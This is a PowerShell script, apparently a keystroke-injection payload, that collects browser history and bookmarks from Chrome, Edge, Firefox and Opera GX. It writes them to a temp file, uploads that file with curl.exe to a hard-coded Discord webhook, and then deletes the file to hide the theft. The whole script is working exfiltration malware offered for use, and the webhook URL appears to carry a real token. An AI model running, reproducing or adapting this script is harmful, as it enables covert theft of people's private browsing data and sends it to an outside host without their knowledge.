
$whuri = "https://discord.com/api/webhooks/1389737338841596057/rCOKlPcSbtO-kkCZGbjMnWE3m9UODYKOh6m2nVE6IOcu6-oB0A_kB_ctPez1EP4x5WAM"

# shortened URL Detection
if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}

$outpath = "$env:temp\history.txt"
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII

# Define the Regular expression for extracting history and bookmarks
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Define paths for data storage
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

# Define browsers and data
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')

foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"

        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}

curl.exe -F file1=@"$outPath" $whuri | Out-Null
sleep 2
Remove-Item -Path $outPath -force
